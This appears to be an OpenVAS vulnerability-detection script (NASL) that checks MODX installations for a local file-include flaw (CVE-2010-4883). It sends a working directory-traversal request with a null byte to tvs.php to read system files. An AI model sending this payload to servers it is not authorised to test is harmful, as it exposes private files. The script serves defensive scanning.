###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_modx_43577.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# MODX Local File Include and Cross Site Scripting Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100833");
  script_version("$Revision: 7577 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2010-09-30 13:18:50 +0200 (Thu, 30 Sep 2010)");
  script_tag(name:"cvss_base", value:"2.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-4883");
  script_bugtraq_id(43577);
  script_name("MODX Local File Include and Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("gb_modx_cms_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("modx_cms/installed");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43577");
  script_xref(name:"URL", value:"http://modxcms.com");

  tag_summary = "MODX is prone to a local file-include vulnerability and a cross-site
  scripting vulnerability because it fails to properly sanitize user-supplied input.";

  tag_impact = "An attacker can exploit the local file-include vulnerability using
  directory-traversal strings to view and execute local files within
  the context of the webserver process. Information harvested may aid
  in further attacks.

  The attacker may leverage the cross-site scripting issue to execute
  arbitrary script code in the browser of an unsuspecting user in the
  context of the affected site. This may let the attacker steal cookie-
  based authentication credentials and launch other attacks.";

  tag_affected = "MODX 2.0.2-pl is vulnerable; other versions may also be affected.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

cpe_list = make_list( "cpe:/a:modx:unknown",
                      "cpe:/a:modx:revolution",
                      "cpe:/a:modx:evolution" );

if( ! infos = get_all_app_port_from_list( cpe_list:cpe_list ) ) exit( 0 );
cpe = infos['cpe'];
port = infos['port'];

if( ! dir = get_app_location( cpe:cpe, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();

foreach file( keys( files ) ) {

  url = string(dir, "/manager/controllers/default/resource/tvs.php?class_key=../../../../../../../../../../../../../../../../",files[file],"%00"); 
  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
